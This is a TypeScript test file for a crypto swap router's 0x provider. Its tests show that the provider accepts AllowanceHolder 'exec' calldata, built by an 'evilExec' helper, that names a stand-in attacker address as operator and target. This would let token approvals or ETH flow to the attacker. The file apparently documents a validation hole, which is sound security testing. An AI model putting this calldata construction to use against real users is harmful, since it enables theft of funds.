import { describe, expect, it } from 'vitest';
import { Evm0xProvider } from '../../../../../website/src/swings/providers/evm0x.ts';
import { AretiaRouter } from '../../../../../website/src/swings/router/router.ts';
import { EVM_NATIVE_ADDRESS, type SwapRequest } from '../../../../../website/src/swings/core/types.ts';

const USDC = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48';
const WETH = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
const USER = '0x1111111111111111111111111111111111111111';
const AH = '0x0000000000001fF3684f28c67538d4D072C22734';
const ATTACKER = '0xbadbadbadbadbadbadbadbadbadbadbadbadbad0';
const w = (h: string) => h.replace(/^0x/, '').padStart(64, '0');
// exec(operator=ATTACKER, token, amount, target=ATTACKER, data=<anything>)
const evilExec = (token: string, amount: bigint) => '0x2213bc0b' + w(ATTACKER) + w(token) + w(amount.toString(16)) + w(ATTACKER) + w('a0') + w('0');
const req = (from: string): SwapRequest => ({ chain: 'ethereum', from: { chain: 'ethereum', address: from }, to: { chain: 'ethereum', address: WETH }, amountIn: 1_000_000n, slippageBps: 100, account: { chain: 'ethereum', address: USER } });

describe('0x AllowanceHolder exec: operator/target/recipient/minOut are not verified', () => {
  it('accepts an exec whose operator and target are an attacker contract (token sale)', async () => {
    const p = new Evm0xProvider({
      quote: async () => ({ liquidityAvailable: true, buyAmount: '500000000000000', minBuyAmount: '495000000000000', totalNetworkFee: '1', route: { fills: [] }, issues: { allowance: { actual: '0', spender: AH }, balance: null }, tokenMetadata: { buyToken: { buyTaxBps: '0', sellTaxBps: '0' } }, transaction: { to: AH, data: evilExec(USDC, 1_000_000n), value: '0', gas: '210000' } }),
      rpc: async () => '0x' + (10n ** 12n).toString(16),
    });
    const router = new AretiaRouter({ providers: [p], adapters: [], isChainEnabled: () => true });
    const q = await p.getQuote(req(USDC));
    expect(router.executabilityProblems(q, req(USDC))).toEqual([]);
    const prepared = await p.buildTransaction(q);
    expect(prepared.simulation.ok).toBe(true);
    const payload = prepared.payload as any;
    expect(payload.approval.spender).toBe(AH); // user approves AllowanceHolder for the full amount
    expect(payload.swap.data.slice(10 + 24, 10 + 64)).toBe(ATTACKER.slice(2)); // operator = attacker, will call AH.transferFrom
  });
  it('accepts a native sale whose value goes to an attacker target via exec', async () => {
    const p = new Evm0xProvider({
      quote: async () => ({ liquidityAvailable: true, buyAmount: '500', minBuyAmount: '495', totalNetworkFee: '1', route: { fills: [] }, issues: { allowance: null, balance: null }, tokenMetadata: { buyToken: { buyTaxBps: '0', sellTaxBps: '0' } }, transaction: { to: AH, data: evilExec(EVM_NATIVE_ADDRESS, 0n), value: '1000000', gas: '210000' } }),
      rpc: async () => '0x' + (10n ** 12n).toString(16), // eth_call "succeeds" (attacker contract just keeps the ETH)
    });
    const r = { ...req(EVM_NATIVE_ADDRESS), to: { chain: 'ethereum' as const, address: USDC } };
    const q = await p.getQuote(r);
    const prepared = await p.buildTransaction(q);
    expect(prepared.simulation.ok).toBe(true);
  });
});
